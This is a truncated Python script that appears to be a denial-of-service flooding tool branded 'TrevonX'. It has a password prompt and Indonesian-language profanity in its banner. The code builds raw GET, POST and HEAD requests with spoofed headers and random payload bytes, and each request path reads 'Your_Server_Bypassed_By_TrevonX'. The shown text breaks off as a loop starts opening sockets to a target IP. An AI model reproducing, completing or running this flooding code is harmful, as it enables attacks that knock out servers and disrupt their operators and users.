...
for i in range(3):
	pwd = input("\033[93m===> Masukkan Pw : ")
	j=3
	if(pwd==password):
		time.sleep(3)
		print("\033[94m===> Nah Gitu Pw Benar ")
		break
	else:
		time.sleep(5)
		print("\033[91m===> Goblok PW nya salah  ")
		continue
time.sleep(3)
...
print("\033[90m")
print("TUNGGU 7 DETIK KONTOL JANGAN BURU-BURU AWAS KALAU ABUSE LU KONTOL JANGAN DI SEBAR INI TOLLS KHUSUS DAFA TREVON AARON  ")
time.sleep(7)
os.system("clear")
...
referers = [
     'Your_Server_Bypassed_By_TrevonX',
     'Your_Server_Bypassed_By_TrevonX',
     'Your_Server_Bypassed_By_TrevonX',
     'Your_Server_Bypassed_By_TrevonX',
     'Your_Server_Bypassed_By_Trevon',
     'Your_Server_Bypassed_By_TrevonX',
     'Your_Server_Bypassed_By_TrevonX',
     'Your_Server_Bypassed_By_TrevonX',
     'Your_Server_Bypassed_By_TrevonX',
...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Your_Server_Bypassed_By_TrevonX HTTP/1.1\r\nHost: " + ip + "\r\n"
...
os.system('color ' +random.choice(['D'])+ " & cls & title TrevonX [ ATTACKING!!]")
def get():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    data = random._urandom(811)
    if choice == "1":
        get_host = "GET /Your_Server_Bypassed_By_TrevonX HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    else:
        get_host = random.choice(['GET','POST','HEAD']) + " /Your_Server_Bypassed_By_TrevonX HTTP/1.1\r\nHost: " + ip + "\r\n"
        request  = get_host + header + "\r\n"
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
